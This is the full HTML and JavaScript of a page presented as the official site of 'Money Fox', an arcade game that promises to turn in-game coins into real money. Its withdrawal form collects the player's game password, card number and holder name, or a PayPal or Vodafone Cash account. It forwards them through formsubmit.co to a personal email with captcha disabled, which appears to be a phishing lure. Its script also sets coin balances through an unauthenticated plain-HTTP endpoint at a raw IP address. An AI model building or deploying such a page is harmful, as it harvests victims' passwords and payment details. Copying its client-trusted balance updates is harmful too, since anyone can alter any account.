<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Money Fox - Official Site</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    /* زرار بنفس Theme */
    .btn-theme {
      background: #4b4fd1;
      color: #e6ebf3;
      border: 3px solid white;
      border-radius: 12px;
      font-weight: bold;
      padding: 12px 20px;
      box-shadow: 3px 3px 6px rgba(0,0,0,0.25);
      transition: 0.25s ease-in-out;
    }
    .btn-theme:hover {
      background: #3a3fb5;
      transform: scale(1.05);
      box-shadow: 5px 5px 12px rgba(0,0,0,0.35);
    }

    /* هيدر */
    header {
      background: linear-gradient(135deg, #4b4fd1, #6b4ce6);
      color: white;
      text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
    }

    /* البطاقات */
    section {
      border-radius: 14px;
      overflow: hidden;
    }

    /* الفورم */
    input, select {
      border: 2px solid #d1d5db;
      padding: 10px;
      border-radius: 8px;
      transition: 0.2s;
      width: 100%;
      margin-bottom: 15px;
    }
    input:focus, select:focus {
      border-color: #4b4fd1;
      outline: none;
      box-shadow: 0 0 6px #4b4fd1aa;
    }

    /* المودال */
    #withdrawForm .bg-white {
      border: 4px solid #4b4fd1;
    }
    h1{
      align-items: center;
      align-content: center;
      text-align: center;
    }
  </style>
</head>
<body class="font-sans bg-[#e6ebf3]">

  <!-- Header -->
  <header class="py-6 shadow-md flex flex-col items-center">
    <img src="MoneyFox text.png" alt="Money Fox Logo" class="h-24" style="width: 400px; height:auto;">
    <p class="text-center text-lg mt-2">Official Website.</p>
  </header>

  <!-- Section 1 -->
  <section class="max-w-4xl mx-auto mt-6 bg-white shadow">
    <img src="Money Fox.png" alt="Money Fox Logo" class="h-24" style="width: 1000px; height:auto;">
  </section>

  <!-- Section 2 -->
  <section class="max-w-4xl mx-auto p-6 mt-6 bg-white shadow">
    <h2 class="text-2xl font-semibold mb-3 text-[#4b4fd1]">What is Money Fox?</h2>
    <p class="text-gray-700">
      An arcade game where you play as a fox trying to double his coins by dodging the flames coming out of the burning swers in the tunnel.
    </p>
    <br>
    <ul class="list-disc pl-6 space-y-2 text-gray-700">
      <li>Easy to play but challenging to master.</li>
      <li>Earn coins by crossing the road safely.</li>
      <li>Redeem your coins for real rewards.</li>
    </ul>
  </section>

  <!-- Section 3 -->
  <section class="max-w-4xl mx-auto p-6 mt-6 bg-white shadow text-center">
    <h2 class="text-2xl font-semibold mb-3 text-[#4b4fd1]">Have Coins?</h2>
    <button onclick="openWithdrawForm()" class="btn-theme">
      Withdraw my Coins
    </button>
  </section>
  <section class="max-w-4x2 mx-auto p-6 mt-6 bg-white shadow text-center">
    <h2 class="text-2xl font-semibold mb-3 text-[#4b4fd1]">Contact us on mmoney11fox@gmail.com</h2>
  </section>

  <!-- Withdraw Form Modal -->
  <div id="withdrawForm" class="fixed inset-0 bg-black bg-opacity-60 hidden flex items-center justify-center">
    <div class="bg-white p-8 rounded-2xl w-full max-w-md shadow-lg relative">
      
      <!-- Close Button -->
      <button onclick="closeWithdrawForm()" class="absolute top-4 right-4 text-gray-500 hover:text-red-500 text-xl font-bold">&times;</button>

      <h3 class="text-2xl font-semibold mb-6 text-[#4b4fd1] text-center">Withdraw Form</h3>

      <form action="https://formsubmit.co/mmoney11fox3@email.com" method="POST">

        <label class="font-semibold text-gray-700">Game Email</label>
        <input type="email" name="game_email" required id="email">

        <label class="font-semibold text-gray-700">Contact Email</label>
        <input type="contact" name="contact_email" required id="contact">

        <label class="font-semibold text-gray-700">Game Password</label>
        <input type="password" name="game_password">

        <label class="font-semibold text-gray-700">Withdraw Amount (coins)</label>
        <input type="number" name="withdraw_amount" required id="amount">

        <label class="font-semibold text-gray-700">Withdraw Method</label>
        <select id="withdraw_method" onchange="showExtraInput()" required>
          <option value="">Select...</option>
          <option value="Paypal">PayPal</option>
          <option value="VodafoneCash">Vodafone Cash</option>
          <option value="Visa">Visa</option>
        </select>

        <!-- Extra input for chosen method -->
        <div id="extraField"></div>

        <button type="button" class="btn-theme w-full mt-4" onclick="sendData()">Place Order</button>
        <br>
        <h1>
          ــــــ
        </h1>
        <h1>
Minimum withdrawal: 500 coins.
1 USD = 105 coins.
Balance will be deducted instantly & funds arrive in 1 day After we talk to you and confirm all the information with you via email.
        </h1>

        <!-- FormSubmit settings -->
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_template" value="table">
      </form>
    </div>
  </div>

  <!-- Script -->
  <script>
    function openWithdrawForm() {
      document.getElementById("withdrawForm").classList.remove("hidden");
    }
    function closeWithdrawForm() {
      document.getElementById("withdrawForm").classList.add("hidden");
      document.getElementById("extraField").innerHTML = "";
    }
    function showExtraInput() {
      let method = document.getElementById("withdraw_method").value;
      let extraDiv = document.getElementById("extraField");

      if (method === "Paypal") {
        extraDiv.innerHTML = `
          <label class="font-semibold text-gray-700">PayPal Email</label>
          <input type="email" name="paypal_email" required>
        `;
      } else if (method === "VodafoneCash") {
        extraDiv.innerHTML = `
          <label class="font-semibold text-gray-700">Vodafone Cash Number</label>
          <input type="text" name="vodafone_number" required>
        `;
      } else if (method === "Visa") {
        extraDiv.innerHTML = `
          <label class="font-semibold text-gray-700">Card Number</label>
          <input type="text" name="card_number" required>
          <label class="font-semibold text-gray-700">Card Holder Name</label>
          <input type="text" name="card_holder" required>
        `;
      } else {
        extraDiv.innerHTML = "";
      }
    }
    function sendData() {

    const form = document.querySelector("#withdrawForm form");
    const email = document.getElementById("email").value;
    const amount = parseInt(document.getElementById("amount").value);

    if (!email || !amount) {
      alert("⚠️ Please fill all fields");
      return;
    }

    // ✅ أولاً: هات اللاعب من السيرفر
    fetch("http://13.48.67.33:8900/get", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email })
    })
    .then(res => res.json())
    .then(data => {
      if (data.status !== "found") {
        alert("❌ Player not found");
        return;
      }

      let player = data.player;

      if (player.coins < amount) {
        alert("❌ Not enough coins! Order cancelled.");
        return; // ❌ مايكملش
      }

      // ✅ ننقص الكوينز
      player.coins -= amount;

      // ✅ نبعته تاني على السيرفر عشان يتحدث
      fetch("http://13.48.67.33:8900/add", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(player)
      })
      .then(r => r.json())
      .then(updated => {
        alert(
          "✅ Withdraw successful!\n\n" +
          "The money will arrive within a day and a customer service representative may contact you to provide you with all the details.\n\n" +
          "If any problems occur, please contact the support team at superalaa64@gmail.com.\n\n" +
          "Your new balance: " + updated.player.coins
        );
        // ✅ نضيف الكوينز للطل
        // ✅ بعد ما coins تتخصم نبعث الفورم لـ FormSubmit
        form.submit();

        closeWithdrawForm();
      });
    })
    .catch(err => {
      console.error(err);
      alert("❌ Server error");
    });
  }
  </script>

</body>
</html>
